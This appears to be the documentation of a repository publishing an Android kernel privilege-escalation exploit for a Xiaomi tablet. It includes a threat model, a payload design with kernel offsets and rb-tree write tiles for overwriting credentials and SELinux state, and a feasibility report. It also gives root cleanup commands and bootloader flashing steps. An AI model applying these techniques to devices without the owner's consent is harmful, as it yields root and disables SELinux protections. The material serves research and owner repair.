`docs/SECURITY.md`:

```md
# Security notes and threat model

> Chinese translation: [`SECURITY.zh-CN.md`](SECURITY.zh-CN.md) — a translation of this file; if the two disagree, this English file is authoritative.

**Scope:** v3.0 (2026-10-25); legacy v1.7–v2.1 behaviour is called out explicitly.

## Read this first

This repository contains a **working local privilege-escalation exploit** for a
specific, fully-patched-at-release Android device and firmware. It is published
for research, education and for owners of the affected device who want to
understand/repair it.

- Only run it on devices **you own** and are willing to wipe/reset.
- Do not use it on shared, corporate or third-party devices.
- The exploit is **not persistent**: a reboot removes everything it did.
- Nothing here writes to partitions, changes `vbmeta`, or unlocks the
  bootloader. The device's verified boot state is not modified.

## Threat model

| attacker starting point | capability |
|---|---|
| any installed app | cannot run the chain directly (App domain is seccomp-filtered and has no `CAP_NET_RAW`; tracefs is denied) |
| Shizuku **shell** server (`uid=2000`, `u:r:shell:s0`) | can run the chain end-to-end (this repo's APK does exactly that) |
| ADB shell (USB debugging) | same as above |
| root already present | full kernel/userland control; this repo is unnecessary |

The intended flow on a clean device: install Shizuku, start it in shell mode
(wireless-debugging / ADB), install this app, press Continue. The app runs the
payload inside a Shizuku-spawned shell process, which becomes root and loads
KernelSU.

## What the exploit changes at runtime

The payload modifies kernel memory only:

1. `selinux_state` (stage 0): an 8-byte unaligned zero at `selinux_state-7`
   clears only `enforcing`; `initialized` and `policycap[]` stay intact (the
   legacy `O3P_SELDIRTY=1` path still writes the old dirty value and dirties
   `policycap[]`).
2. `task_struct.cred` of the payload process (stage 1) → a fake cred page with
   uid 0, full capabilities and the original SELinux blob (still shell domain).
3. Loads a KernelSU LKM (relinked at runtime for the current KASLR slide) with
   **no init patch** by default; because `policycap` is clean, KernelSU's own
   `setenforce(1)` does not break networking. `O3P_CODEPATCH=1` restores the
   legacy patch (which then needs the old dirty-write caveats below).

Nothing is written to disk except:
- `/data/local/tmp/o3p.bin`, `/data/local/tmp/o3p_ksu.ko` (the payload and the
  patched module, mode 0755),
- `/data/local/tmp/o3p_proof.txt`, `/data/local/tmp/o3p_rootd.log` (mode 0600),
- optional app logs under the app's external files dir.

## Known side effects

### Legacy policycap corruption (`O3P_SELDIRTY=1` only) → network loss

The v3 default does not touch `policycap[]`. Only the legacy dirty write
(`O3P_SELDIRTY=1`) cannot preserve it, and then re-enabling SELinux enforcement
(any `setenforce 1`) makes the Wi-Fi transmit path stall: `wlan0` TX freezes,
RX continues, all traffic dies. Recovery:

- `setenforce 0` (from a context with `CAP_MAC_ADMIN`, e.g. KernelSU `su`), or
- reboot (clears the corruption; root/KSU are lost).

v1.8–v2.1 shipped a probe/warning and a one-click `su -c setenforce 0`; v3.0
removed them because the default no longer corrupts `policycap`.

### Global permissive SELinux (legacy paths only)

The v3 default ends in Enforcing with MAC on. Only `O3P_SELDIRTY=1` (or a manual
`setenforce 0`) leaves the device Permissive; then all SELinux MAC checks are
disabled:

- SELinux domain isolation is gone; a local app compromise is much easier to
  turn into root (tracefs/kprobe interfaces are 0777 and only SELinux stops
  them).
- Some system components behave differently (e.g. zygote/`powerkeeper`
  `selinux_android_setcontext` failures observed in logs).
- Detection: `getenforce`, KernelSU manager's "permissive" badge.

This is not a normal daily-driver posture. Reboot when done.

### Kernel taint / ABI mismatch

The KernelSU LKM was built by upstream for `android17-6.18`
(`6.18.32-4k-g47cc22554442-dirty`) but is loaded on `6.18.21-…`. The runtime
relink bypasses symbol/CRC namespace checks; the module is tainted (`(O)` in
`/proc/modules`). Treat this as a research setup, not a production root.

### Leftover files and labels

On normal runs, files created in `/data/local/tmp` get
`u:object_r:shell_data_file:s0` and are fine. Files created during the abandoned
"zero-write" experiment (`initialized=0`) stay `u:object_r:unlabeled:s0` and
cannot be read/deleted by shell while enforcing. With root in a non-enforcing
boot they can be repaired in bulk:

```sh
chcon -R u:object_r:shell_data_file:s0 /data/local/tmp
```

or deleted/recreated; the label is a persistent `security.selinux` xattr.

### Seccomp observation

Measured on the target (clean cold boot): `init`, `adbd`, `zygote64`, the
Shizuku server and rootd have **no seccomp filter**; `system_server`,
`systemui` and ordinary apps have 2/1. This repo does not change any process's
seccomp state — it is an Android-side design property, reported here only
because it affects exploitability.

## Recovery / cleanup checklist

1. `setenforce 0` if the network is broken (or reboot).
2. Remove test artifacts: `rm -f /data/local/tmp/o3p*` (root), and uninstall the
   APK and, if installed by the app, the KernelSU manager.
3. Reboot: SELinux returns to Enforcing, `selinux_state` is intact, no root.
4. If you granted KSU superuser to apps, `ksud`/manager allow-list lives in
   `/data/adb` and survives reboots — remove it with the manager or
   `rm -rf /data/adb/ksu /data/adb/modules` if you installed them.

## Reporting

Please do not file this as a vulnerability against Xiaomi's bounty program
without reading `docs/history/CVE-2026-98260_FEASIBILITY.md`; the underlying bugs
(`CVE-2026-98260`, and the earlier `CVE-2026-64560`/`CVE-2026-49881`) are
documented there with upstream fix references.

```

`docs/SECURITY.zh-CN.md`:

```md
# 安全说明与威胁模型（中文版）

> 英文原版：[`SECURITY.md`](SECURITY.md)。若两者不一致，以英文版为准并同步本文件。

**适用范围：** v3.0（2026-10-25）；旧 v1.7–v2.1 行为会单独标注。

## 先读这一节

本仓库包含一个**可用的本地提权 exploit**，针对一台在发布时已完全打补丁的特定
Android 设备与固件。发布目的是研究、教育，以及帮助受影响的设备机主理解/修复
自己的设备。

- 只在**你自己拥有**、且愿意清空/重置的设备上运行。
- 不要用于共享、公司或第三方的设备。
- 该 exploit **不持久**：重启会清除它做过的一切。
- 这里不写分区、不改 `vbmeta`、不解锁 bootloader。设备的 verified boot 状态
  不变。

## 威胁模型

| 攻击者起点 | 能力 |
|---|---|
| 任意已安装 App | 不能直接跑这条链（App 域受 seccomp 过滤、没有 `CAP_NET_RAW`；tracefs 被拒） |
| Shizuku **shell** server（`uid=2000`，`u:r:shell:s0`） | 能端到端跑通（本仓库的 APK 就是这么做的） |
| ADB shell（USB 调试） | 同上 |
| 已有 root | 完全的内核/用户态控制；不需要本仓库 |

干净设备上的预期流程：安装 Shizuku，以 shell 模式启动（无线调试 / ADB），安装
本 App，点 Continue。App 在 Shizuku 拉起的 shell 进程里运行载荷，该进程变成
root 并加载 KernelSU。

## 运行时改了什么

载荷只修改内核内存：

1. `selinux_state`（stage 0）：在 `selinux_state-7` 做 8 字节非对齐零写，只清
   `enforcing`；`initialized` 与 `policycap[]` 原样保留（只有旧路径
   `O3P_SELDIRTY=1` 仍写旧的脏值、会污染 `policycap[]`）。
2. 载荷进程的 `task_struct.cred`（stage 1）→ 一个伪造 cred 页：uid 0、
   full capabilities，SELinux blob 沿用原来的（仍是 shell 域）。
3. 加载一个 KernelSU LKM（运行时按当前 KASLR slide 重链接），**默认不打 init
   补丁**；`policycap` 干净，所以 KSU 自己 `setenforce(1)` 不影响网络。
   `O3P_CODEPATCH=1` 才会回退旧补丁（那时才需要下面的旧脏写注意事项）。

除了以下文件，不写磁盘：

- `/data/local/tmp/o3p.bin`、`/data/local/tmp/o3p_ksu.ko`（载荷与打好补丁的
  模块，模式 0755），
- `/data/local/tmp/o3p_proof.txt`、`/data/local/tmp/o3p_rootd.log`（模式 0600），
- App 外部文件目录下的可选日志。

## 已知副作用

### 旧 policycap 污染（仅 `O3P_SELDIRTY=1`）→ 开启 enforcing 时断网

v3 默认不碰 `policycap[]`。只有旧的脏写（`O3P_SELDIRTY=1`）无法保留它，此时重新
开启 SELinux 强制模式（任何 `setenforce 1`）会让 Wi-Fi 发送路径卡死：`wlan0` TX
冻结、RX 继续、所有流量失效。恢复：

- `setenforce 0`（需要有 `CAP_MAC_ADMIN` 的上下文，例如 KernelSU 的 `su`），或
- 重启（清除污染；root/KSU 丢失）。

v1.8–v2.1 会探测并告警、提供一键 `su -c setenforce 0`；v3.0 已移除，因为默认
路径不再污染 `policycap`。

### 全局 Permissive SELinux

设备停留在 Permissive 期间，所有 SELinux MAC 检查都关闭：

- SELinux 域隔离消失；本地 App 被攻破后更容易变成 root（tracefs/kprobe 接口是
  0777，只靠 SELinux 拦着）。
- 某些系统组件行为会变（例如日志里观察到 zygote/`powerkeeper` 的
  `selinux_android_setcontext` 失败）。
- 可检测：`getenforce`、KernelSU 管理器的“宽容模式”标记。

这不是日常主力机该有的姿态。用完请重启。

### 内核 taint / ABI 错配

KernelSU LKM 是上游为 `android17-6.18`
（`6.18.32-4k-g47cc22554442-dirty`）构建的，却加载在 `6.18.21-…` 上。运行时
重链接绕过了符号/CRC 命名空间检查；模块处于 tainted 状态（`/proc/modules` 里的
`(O)`）。请把它当研究环境，而不是生产级 root。

### 残留文件与标签

正常运行时，`/data/local/tmp` 里创建的文件会得到
`u:object_r:shell_data_file:s0`，没有问题。被废弃的“零写”实验
（`initialized=0`）期间创建的文件会停留在 `u:object_r:unlabeled:s0`，在
enforcing 下 shell 无法读取/删除。在非 enforcing 且拿到 root 的 boot 里可以批量
修复：

```sh
chcon -R u:object_r:shell_data_file:s0 /data/local/tmp
```

或者删掉重建；标签是持久化的 `security.selinux` xattr。

### Seccomp 观测

在目标机上实测（干净冷启动）：`init`、`adbd`、`zygote64`、Shizuku server 与
rootd **没有 seccomp 过滤**；`system_server`、`systemui` 与普通 App 是 2/1。
本仓库不改变任何进程的 seccomp 状态 —— 这是 Android 侧的设计属性，这里记录
只是因为它影响可利用性。

## 恢复 / 清理清单

1. 如果网络坏了，先 `setenforce 0`（或重启）。
2. 删除测试产物：`rm -f /data/local/tmp/o3p*`（需 root），卸载 APK；若 App 装过
   KernelSU 管理器，也一并卸载。
3. 重启：SELinux 回到 Enforcing、`selinux_state` 完好、没有 root。
4. 如果你给某些 App 授予过 KSU 超级用户，`ksud`/管理器允许列表在 `/data/adb`
   下且能跨重启保留 —— 用管理器移除，或在你安装过的情况下执行
   `rm -rf /data/adb/ksu /data/adb/modules`。

## 报告

在未读 `docs/history/CVE-2026-98260_FEASIBILITY.md` 之前，请不要把本工作当作漏洞提交给
小米的赏金计划；底层漏洞（`CVE-2026-98260`，以及更早的
`CVE-2026-64560`/`CVE-2026-49881`）都在该文件里记录了上游修复引用。

```

`docs/V3-DESIGN.md`:

```md
# v3 payload design (historical; shipped as two-reap v3.0)

Status: this document records the **single-reap** design explored on branch
`exp/v3-tracepoint`. That variant (v3a/v3b/v3c) panicked three times and was
abandoned; v3.0 ships a **two-reap** variant that keeps the enforcing-only zero
and the no-init-patch loader. See “Outcome” at the end.

## Goal

One UAF, one reclaimed slab page, one reap — and in that single reap do both
things v2.x needed two separate exploitations for:

1. install the fake `cred` (`task->cred = fake cred page`);
2. clear only `selinux_state.enforcing` (unaligned zero write), leaving
   `initialized` / `policycap` intact.

Side effects we want at the end:

- `getuid()==0`, full caps; SELinux ends **Enforcing** after KSU's `setenforce(1)` in v3.0 (Permissive only on the legacy `O3P_SELDIRTY=1` path);
- KernelSU LKM loads **without** the `mov w0,#0` init patch (`KSU_CODEPATCH`
  skipped), and when KernelSU sets `enforcing=1` again the network keeps
  working (clean `policycap`);
- no `kprobe_events`, no perf dependency where possible (tracked as v3b).

## Building blocks (already validated on this device)

| piece | where | evidence |
|---|---|---|
| B: slide + cred via static `kmem_cache_alloc` tracepoint | `experiments/tp_slide.c` | `SLIDE 0x1db3000000` matched payload `SLIDE_CALC`, `CREDSITE match=1` |
| A: unaligned `selinux_state-7` zero write | v3.0 default (`O3P_SELDIRTY=1` = old dirty write) | `SEL_OK state=0x100000101010100`, KSU loaded, Enforcing + network OK |
| C: PFN-verified reclaim (AIO rings) | `experiments/tp_reclaim.c` | clean boot single run: 65/152 node pages captured, `MATCH ring=492 node_page=1` |
| D: three trees, three writes in one reap | `O3P_D3=1` | `D3PAGE slot2 0`, `slot3 0xdeadbeef -> 0`, `SEL_OK` |

## Architecture

`posix_cputimers` has three timerqueue bases (PROF/VIRT/SCHED; rb_node at
`TASK+0x870/0x888/0x8a0`). The exec thread arms one timer per base with the
per-thread clockid encoding `((~tid)<<3)|4|base`, so the three `k_itimer`
nodes share one 8 KiB slab page. When that page is reclaimed by our sprayed
page, `posix_cpu_timers_exit()` walks all three trees and we get three
independent `rb_erase` fast-path writes.

Tile layout (each node: `+0xe0 = pc`, `+0xe8 = rb_right = 0`,
`+0xf0 = rb_left = S`; slow path writes `*(S) = pc`):

| tree | `pc` | `S` | effect |
|---|---|---|---|
| PROF | `fake_page_va` | `PTASK+0x908` | `task->cred = fake_page_va` (user becomes uid 0) |
| VIRT | `0` | `selinux_state-7` | 8-byte unaligned zero: `enforcing=0` only |
| SCHED | `0` | `fake_page_va+0x10` | scratch zero write (witness / no-op) |

The PROF tile also makes `rb_erase` write into the fake page through the
parent link: `pc = fake_page_va`, `parent = fake_page_va`, and
`[fake_page+0x10]` currently holds the victim node address (`q[2] = N`), so
the "parent's child" branch rewrites `q[2] = PTASK+0x908`. That slot is not
used after the reap, so it is harmless (`repair_fake_cred()` rewrites the
identity fields afterwards).

## Staged delivery

### v3a — merged single-reap triple write (no leak changes yet)

Keep the existing kprobe/perf leaks (`tm`, `x`, `read_addrs`, perf page) and
merge stage0+stage1 into one UAF with the tile table above.

- env: `O3P_D3V3=1`
- reap check: `getuid()==0 && geteuid()==0`, then read
  `/sys/fs/selinux/enforce` (expect `0`); print `D3V3 uid=… euid=… enf=…`.
- then the normal `ksu_load()` path with `O3P_NO_CODEPATCH=1`.

Acceptance: one attempt, `D3V3 uid=0/0 enf=0`, `KSU_MODULE LIVE`,
`getenforce` Enforcing after KSU load, `ping`/`nc` OK.

### v3b — tracepoint-only leaks

Replace the `tm`/`x` kprobes and `read_addrs`:

- slide: B;
- timer addresses: `kmem_cache_alloc` records with
  `call_site == alloc_posix_timer+slide` and `bytes_req == 0x180`,
  filtered to the child pid — the record's `ptr` is `A_i`, so no
  `__set_task_comm` / `do_timer_create` probe is needed;
- `TASK`/`PTASK`: only needed for the dest slot and for reading the three
  rb_node fields; the dest is `PTASK+0x908` (parent task). A `task_struct`
  allocation record (`kmem_cache_alloc`, `name=task_struct`) can supply the
  parent task pointer, filtered by pid; fall back to the existing kprobe
  if it cannot be identified unambiguously;
- perf page: can stay for v3b; replacing it with the victim page itself
  (EA style, `cred = node+0x20`) is optional and tracked as v3c.

Acceptance: `ENFORCE`/`KSU`/`uid` results identical to v3a with
`/sys/kernel/tracing/kprobe_events` never opened (verified with
`strace`-free check: `grep -c '' kprobe_events` unchanged and payload log
has no `o3p/` probe lines).

### v3c — PFN-verified reclaim + app changes

- Switch the page source from `sendmsg` skb pages to `io_setup(1)` rings and
  use C's pfn matching to confirm the ring owns the node page before
  reaping; fail closed instead of retrying with a stale tree.
- App: drop the v1.8 "restore Permissive" guard to a mere warning (KSU now
  keeps Enforcing and the network stays healthy), remove the codepatch
  dependency, use KSU `su` for privileged actions instead of the shell-domain
  rootd (rootd keeps working when Permissive, but is limited under
  Enforcing).

## Risks / open questions

- three nodes must share one 8 KiB page; measured 3/3 so far, but the tile
  builder must refuse (`D3ADDR split`) otherwise;
- the PROF tile rewrites `q[2]` through the parent link — keep the fake
  page layout in sync (`repair_fake_cred()` already rewrites identity
  fields, not `q[2]`);
- writing `cred` first means the VIRT/SCHED erases run with a fake cred
  active; validated in D (kernel-side path only) but not yet with a real
  cred pointer — v3a is the first test;
- `enforce` read from the payload process is the user-visible oracle; if
  SELinux blocks it the payload falls back to `SEL_OK` from the kernel read
  (`read_addrs`) when available.

## Test matrix

| case | expected |
|---|---|
| clean boot, `O3P_D3V3=1 O3P_NO_CODEPATCH=1`, no KSU | `D3V3 uid=0/0 enf=0`, one attempt |
| same, KSU loads | `KSU_MODULE LIVE`, `getenforce=Enforcing`, `ping`/`nc` OK |
| cold boot app (v3 build) | Continue → KSU manager foreground, Permissive or Enforcing but network OK |
| repeat without reboot | documented limitation (allocator contamination, C) |

## Rollback

`O3P_D3V3` unset → v3.0 two-reap default (the shipped path).

## Outcome (2026-10-25)

v3a/v3b/v3c crashed right after `D3ADDR` in three consecutive cold boots; the
single-reap design was abandoned. v3.0 instead ships a **two-reap** variant on
`main` (`dc06899`, tag `v3.0`): A (enforcing-only zero) in stage 0 and the
proven `task_cred` swap in stage 1, with KernelSU loaded without the init patch.
Experiments B (`tp_slide`) and C (`tp_reclaim`) remain validated prototypes; see
`experiments/README.md`.

```

`docs/history/ALTERNATIVE_ROOT_DIRECTIONS.md`:

```md
# yingtian（小米平板 9 Pro Max / XRING O3）替代 root 方向调研

> **Historical (superseded 2026-10-25)** — written before CVE-2026-98260 was found, when an
> unlock + Magisk route looked like the only path. It is kept for the research record only;
> the current mainline is the in-app chain in `README.md` / `docs/ARCHITECTURE.md`
> (release v3.0). Do not follow its unlock recommendations for this device.


> **状态更新（2026-10-23 18:28）**：用户决定暂不走解锁路径，保留经验待后续进展；本文件仅作备查，不执行解锁。归档要点见 `notes/05_ALTERNATIVE_DIRECTIONS.md`（原工作区文件，未随仓库分发）。

- 日期：2026-10-23
- 设备：Xiaomi Pad 9 Pro Max（代号 yingtian，型号 M367FC），**玄戒 O3（XRING O3）自研 SoC**，HyperOS 4.0 / Android 17.0，当前系统 OS4.0.16.0.XBMCNXM
- 前提：现有 EnneaO3V2 的 APK 路线与脚本路线均已在 4.0.16 上失效（见 [OTA_4.0.16_kernel_report.md](OTA_4.0.16_kernel_report.md)）、bootloader 锁定、设备已拔出

## 一、方向总览（按可行性排序）

| # | 方向 | 结论 | 关键前提 / 代价 |
|---|---|---|---|
| **A** | **非官方解锁 Bootloader（LittlenineEnna / XRING O3 方案）→ Magisk/KernelSU** | **目前唯一现实可行的 root 路线** | 需要作者的解 BL 材料/工具，且需支持 Pad 9 Pro Max；解锁会清空数据，非官方方案有变砖风险 |
| B | 内核 1-day LPE 移植（DirtyFrag CVE-2026-43284 / GhostLock CVE-2026-43499） | **已排除：4.0.16 内核两个漏洞都已修复**（二进制级核实，见第二节） | — |
| C | 等待 Ennea / 社区推出针对 4.0.16 的新工具或新漏洞 | 不确定；作者公开表态偏悲观（“O3 越狱不会有了”），但 2026-10 又完成了 18 Fold 的解锁 | 时间不可控 |
| D | 现成免解锁 root 工具（KSuRoot / DirtyFrag 系） | **不适用**：它们基于 GhostLock/DirtyFrag，且只支持 6.1/6.6/6.12（及部分 5.x）内核族；本机为 6.18 / Android 17 | — |
| E | 降级回 4.0.15（恢复旧漏洞） | **不可行**：bootloader 锁定（`ro.boot.flash.locked=1`、verified boot green）；且 vbmeta 带 ARB 计数 | — |
| F | 维持非 root 用法（Shizuku/ADB 自动化） | 兜底方案 | 无需 root，但功能受限 |

## 二、内核补丁核实：三条 1-day 路线全部关闭

| CVE | 漏洞 | 修复版本 | 本机 4.0.16 内核证据 | 判定 |
|---|---|---|---|---|
| **CVE-2026-49881** | Telecom InCallController 逻辑缺陷 → system_server/network_stack 注入 | 2026-09 | 真机日志 `TELECOM_ROUTE_UNAVAILABLE … the entry is patched` | ❌ 已修复 |
| **CVE-2026-64560** | posix-cpu-timers 非 leader exec() 竞态 UAF | 2026-07（commit `920f893f735e…`；backport 6.1.180/6.6.147/6.12.100 等） | 内核包含补丁新增的 `timer_lock_sighand()` 助手，反汇编逐条匹配（pid_task 重试 / `dmb ishld`=`smp_rmb` / `brk #0x800`=`WARN_ON_ONCE`）；device 上 72 次 stage1 全 miss | ❌ 已修复 |
| **CVE-2026-43284** | Dirty Frag：xfrm ESP 对 shared skb frag 原地解密 → page-cache 写原语 | 6.18.28（commit `71a1d9d985d2…`） | `esp_input`/`esp6_input` 反汇编中同时检查 `frag_list` 与 `SKBFL_SHARED_FRAG`（`tbnz w9,#1` → 走 `skb_cow_data` 慢路径） | ❌ 已修复 |
| **CVE-2026-43499** | GhostLock：rtmutex `remove_waiter()` 用 `current` 导致 futex PI UAF | 6.18.27（commit `3bfdc63936dd…`） | `remove_waiter` 使用 `waiter->task`（`[waiter+0x50]`）而非 `current`，并对 `waiter_task->pi_blocked_on`（`str xzr,[task,#0xa20]`）清零 | ❌ 已修复 |

> 说明：4.0.16 安全补丁级别为 2026-09-01，且该内核明显回合入了 2026-07 之后的内核 CVE 修复；三条公开 1-day 均已在其中。

## 三、方向 A 详解：解锁 Bootloader → Magisk

### 3.1 依据

- 2026-10 多家媒体报道：**Xiaomi 18 Fold（lhasa，XRING O3 同款自研芯片）已被 LittlenineEnna 非官方解锁 bootloader**；Xiaomi 18 Pro 也由 realMlgmXyysd 解锁。说明 XRING O3 平台的解锁并非不可能。
- Pad 9 Pro Max（yingtian）与 18 Fold **同属 XRING O3 首发设备**，但 **目前尚未检索到该平板解锁成功的公开报告**——需要向作者/社区确认是否已支持。
- 该方法的材料通常通过作者社群（酷安/QQ/Telegram/网盘）分发，工作区中不包含。

### 3.2 解锁后的 root 步骤（已备好所需镜像）

`prep/` 目录已准备好：

| 文件 | 说明 |
|---|---|
| `prep/Magisk-v30.7.apk` | Magisk v30.7（11,613,864 B，sha256 `e0d32d2123532860f97123d927b1bb86c4e08e6fd8a48bfc6b5bee0afae9ebd5`） |
| `prep/init_boot-OS4.0.16.0.XBMCNXM.img` | 本机 4.0.16 原厂 init_boot（header v4，ramdisk 2,616,413 B）—— Magisk 需要修补它 |
| `prep/boot-OS4.0.16.0.XBMCNXM.img` | 本机 4.0.16 原厂 boot |
| `prep/vbmeta-OS4.0.16.0.XBMCNXM.img` | 本机 vbmeta（rollback_index=1,788,220,800） |

流程（解锁成功后）：

1. 手机端安装 `Magisk-v30.7.apk`；
2. 把 `init_boot-OS4.0.16.0.XBMCNXM.img` push 到手机（如 `/sdcard/Download/`）；
3. Magisk →「安装」→「选择并修补一个文件」→ 选该 init_boot → 生成 `magisk_patched-*.img`；
4. `adb pull` 回电脑；进入 fastboot：`fastboot flash init_boot magisk_patched-*.img`；
   - 若开机校验失败，再执行（以实际 fastboot 支持为准）：
     `fastboot --disable-verity --disable-verification flash vbmeta prep/vbmeta-OS4.0.16.0.XBMCNXM.img`
5. 重启；Magisk 显示已安装即 root 完成；随后可按需安装 Zygisk / LSPosed 模块。
6. （可选）解锁后可刷 4.0.15 fastboot 官方包，恢复旧的 Ennea 漏洞利用环境；但更简单的是直接用 Magisk。

### 3.3 风险

- 非官方解 BL：可能变砖、失去保修、触发 AVB/ARB；**务必先备份数据**（解锁通常清空数据）。
- 解锁后 Play Integrity/部分银行 App 可能不可用，需要额外隐藏。
- 材料来源需自行甄别（陌生人的 LK/fastboot 工具存在植入风险）。

## 四、结论

- 免解锁的内核利用路线（DirtyFrag / GhostLock / posix-cpu-timer / Telecom）在 4.0.16 上**全部被修复**，短期内没有可行 exploit。
- **唯一现实的 root 方向是拿到作者（LittlenineEnna）的 XRING O3 非官方解锁材料，先解锁 bootloader，再用 Magisk 刷 init_boot。**
- 已准备好解锁后所需的一切镜像与 Magisk；需要你确认：① 能否从作者社群拿到 XRING O3 / Pad 9 Pro Max 的解锁工具；② 是否接受清空数据与变砖风险。

## 五、外部参考

- Xiaomi 18 Fold / 18 Pro 非官方解锁报道：<https://ximitime.com/xiaomi-18-pro-and-fold-get-unofficial-bootloader-unlock-101065/>、<https://en.gizchina.it/2026/10/xiaomi-18-pro-fold-bootloader-sbloccato/>
- O3 越狱前景讨论（含“别把宝押在越狱上”）：<https://post.smzdm.com/p/a3m0e33d/>
- KSuRoot（GhostLock 工具，支持内核 6.1/6.6/6.12，不含 6.18）：<https://github.com/hmascs/KSuRoot>
- 免解锁 root 漏洞列表（ABL cmdline injection / Adreno 等，主要适用于高通平台，不适用 XRING O3）：<https://github.com/lokey0905/rootWithoutUnlockBootloaderList>
- 本报告引用的内核修复 commit：
  - CVE-2026-64560 `920f893f735e92ba3a1cd9256899a186b161928d`
  - CVE-2026-43284 `71a1d9d985d26716f74d21f18ee8cac821b06e97`（6.18.28）
  - CVE-2026-43499 `3bfdc63936dd4773109b7b8c280c0f3b5ae7d349`（6.18.27）

`docs/history/CVE-2026-98260_FEASIBILITY.md`:

```md
# CVE-2026-98260 on Xiaomi Pad 9 Pro Max (yingtian) — Feasibility Verification Report

> **Historical (2026-10-23 initial report; superseded)** — this is the first feasibility
> verification, written before the exploit chain existed. It records the "no usable attack
> surface" state *prior* to this CVE. The shipped mainline is release v3.0; see
> `README.md` and `docs/ARCHITECTURE.md` for the current design.


> Chinese translation: [`CVE-2026-98260_FEASIBILITY.zh-CN.md`](CVE-2026-98260_FEASIBILITY.zh-CN.md) — a translation of this file; if the two disagree, this English file is authoritative.

Date: 2026-10-23 (Asia/Shanghai)
Device: Xiaomi yingtian (Pad 9 Pro Max, XRING O3), HyperOS 4.0.16.0.XBMCNXM, Android 17
Kernel: 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k
ADB: `adb -s <serial>`; boot_id `1b71aad5-73b0-4275-81a1-ce40712c2be5` (never rebooted during tests)
Work dir: `<workspace>/work`

## Verdict

**CVE-2026-98260 is exploitable on this exact firmware.** From an unprivileged ADB shell
(`uid=2000(shell)`, SELinux Enforcing at start) the full primitive chain was proven in real device
runs:

1. **UAF triggered** — a freed `struct k_itimer` node is still linked in the zombie task's
   `posix_cputimers` timerqueue (verified via kprobes).
2. **Freed slab page reclaimed** — the order-1 `posix_timers_cache` slab page is returned to the
   buddy allocator (after a targeted `posix_timers` churn) and re-used as a user-writable Unix-socket
   skb data page (`send(..., 7872)` gives one order-1 page with fully user-controlled content).
3. **Arbitrary 8-byte kernel zero-write** — fake RB-tree erase in `timerqueue_del`/`rb_erase`
   yields `*(target)=0`; confirmed with an end-to-end read-back (`VERDICT WRITE_PRIMITIVE_CONFIRMED`).
4. **uid 0** — zero-writing `task_struct->cred` uid/gid, euid/egid, fsuid/fsgid gives
   `uid=0 euid=0 gid=0` inside the exploiting process (3/3 stages, t30).
5. **KASLR slide derived independently** — `cred->user_ns - init_user_ns` gives
   `slide=0x2c2ea00000` (align check passes), matching the earlier KASLR gate result.
6. **SELinux set to Permissive system-wide** — zero-writing `selinux_state.enforcing` (and the
   adjacent initialized/policycap bytes) succeeded: `/sys/fs/selinux/enforce` = 0,
   `getenforce` = **Permissive**; the change persists for the current boot (boot_id unchanged).

## Root cause / vulnerable code

`begin_new_exec()` (static `0xffffffc0802cf910`) cleans up POSIX timers *after*
`exec_task_namespaces()`, while the `mmap_read_lock_killable(old_mm)` failure point (SIGKILL during
exec, after `point_of_no_return`) is already behind it: `posix_cpu_timers_exit` @0x2cfcb8,
`exit_itimers` @0x2cfcc8, `flush_itimer_signals` @0x2cfccc. Fix commit acb03d388181
("exec: Cleanup POSIX timers right after de_thread()", fixed in 6.18.54+) is absent — kernel 6.18.21.

## Why three earlier "easy" primitives missed (and what worked)

* **t21** (no exec, SIGKILL only) showed freed order-1 slab pages are reclaimed with ~77% hit rate
  when the parent is *not* pinned: the last exiting thread frees the page into its CPU's per-CPU
  order-1 page list and the parent is woken on that same CPU.
* The real UAF path differs: the victim slab stays in SLUB's frozen/partial state and *never* goes
  back to buddy (t27: `W1FS fs=4628 victim=0`). **Fix: `posix_timers` churn after waitid**
  (`timer_create`/`timer_delete` ×8000, t29) forces the cache to release slabs; hit rate rises to
  about 1 in 2–5 attempts.
* Order-0 user-mappable primitives (AIO ring, perf metadata page, pipes, dma-heap, io_uring) cannot
  reclaim an order-1 page; Unix-socket skb `send(7872)` allocates exactly one order-1 page
  (gfp=0x4428c0) and is the working reclaim primitive.

## Key kernel facts (base `0xffffffc080000000`)

| Item | Value |
| --- | --- |
| `posix_timers_cache` slab | order-1 (8 KB), 21 objects × 0x180 |
| `k_itimer` node (`it.cpu.entry`) | object + 0xe0 |
| timerqueue heads in task_struct | +0x870, +0x888, +0x8a0 (cached next at +0x878/+0x890/+0x8a8) |
| `timerqueue_del` / `rb_erase` | 0xffffffc080149ec0 / 0xffffffc080149f34 |
| `posix_cpu_timers_exit` | 0xffffffc08014bfbc |
| `init_user_ns` | 0xffffffc0826d10d8 |
| `selinux_state` | 0xffffffc082959630 (enforcing at +0x00) |
| cred layout | usage +0x00, uid +0x08, euid +0x18, fsuid +0x20, security +0x80, user_ns +0x90 |

Slide on this boot: `0x2c2ea00000` → runtime base `0xffffffecaea00000`.

## Device state after verification

* SELinux: **Permissive** (system-wide, current boot only; restore with reboot).
* No persistent files changed, bootloader still locked, no root service installed.
* Tests only ran in `/data/local/tmp` (`t1…t31` binaries/logs) and were read-only on the system
  image; kernel memory was only modified through the exploit primitive itself
  (`selinux_state` bytes, our own process cred).

## Remaining step for full root (not yet implemented)

The zero-write primitive cannot set capability masks. Full root requires the **pointer-write** variant:
`rb_parent_color = fake_cred_kva` (a user-mapped perf page whose direct-map VA is leaked via
`rb_alloc user_page=+0x118($retval)`) so that `timerqueue_del` writes the fake cred pointer into
`task_struct->cred`; `panic_on_warn=0` makes the `brk #0x800` WARN path non-fatal. Design
constraints (second `timerqueue_del` recursion, side-effect offset `parent+8` vs `parent+0x10`,
fake cred contents: caps = 0x1ffffffffff, security blob reused from the real cred) are documented in
the work log; no code written yet.

```

`docs/history/CVE-2026-98260_FEASIBILITY.zh-CN.md`:

```md
# CVE-2026-98260 在小米 Pad 9 Pro Max（yingtian）上的可行性验证报告（中文版）

> **历史文档（2026-10-23 初版报告，已被取代）** — 本报告写于利用链尚未完成时，记录的是
> 该 CVE 之前的“暂无可用攻击面”状态。当前主线为 release v3.0；设计说明见
> `README.zh-CN.md` 与 `docs/ARCHITECTURE.zh-CN.md`。


> 英文原版：[`CVE-2026-98260_FEASIBILITY.md`](CVE-2026-98260_FEASIBILITY.md)。若两者不一致，以英文版为准并同步本文件。
>
> 译者注：本报告记录的是 2026-10-23 的可行性验证时点（当时只有零写原语）。后续的
> 指针写版本已经实现完整 root + KernelSU，见 [`README.md`](../README.md) 与
> [`APP_O3_ROOT.md`](APP_O3_ROOT.md)。

日期：2026-10-23（Asia/Shanghai）
